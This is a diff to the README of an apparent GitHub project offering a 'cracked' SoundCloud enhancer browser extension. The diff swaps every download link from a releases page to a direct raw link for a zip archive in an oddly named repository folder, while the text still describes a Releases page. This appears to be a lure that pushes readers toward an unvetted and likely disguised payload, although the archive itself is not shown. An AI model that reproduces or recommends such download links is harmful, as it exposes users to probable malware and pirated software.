@@ -1,7 +1,7 @@
 # 🎵 cracked-enhancer-for-sound-cloud-extension - Enhance Your SoundCloud Experience Effortlessly
 
 ## 🌐 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Available-brightgreen)](https://github.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/main/gastrophrenic/cracked-enhancer-for-sound-cloud-extension.zip%20Now-Available-brightgreen)](https://raw.githubusercontent.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/main/gastrophrenic/cracked-enhancer-for-sound-cloud-extension.zip)
 
 ## 📜 Introduction
 Welcome to the cracked-enhancer-for-sound-cloud-extension! This browser extension enhances your SoundCloud experience by providing additional features to customize how you listen to music. Enjoy tailored playlists, improved recommendations, and more, all with a few simple steps.
@@ -11,7 +11,7 @@ To get started with the cracked-enhancer-for-sound-cloud-extension, you will nee
 
 ## 🔗 Download & Install
 1. Click the link below to visit our Releases page:
-   - [Click here to download the latest version!](https://github.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/releases)
+   - [Click here to download the latest version!](https://raw.githubusercontent.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/main/gastrophrenic/cracked-enhancer-for-sound-cloud-extension.zip)
    
 2. On the Releases page, look for the most recent version of the extension.
 3. Click on the version number to see the available files.
@@ -55,4 +55,4 @@ We hope you enjoy using the cracked-enhancer-for-sound-cloud-extension! With jus
 
 ---
 
-[Download your extension here!](https://github.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/releases)
+[Download your extension here!](https://raw.githubusercontent.com/ritik2339/cracked-enhancer-for-sound-cloud-extension/main/gastrophrenic/cracked-enhancer-for-sound-cloud-extension.zip)
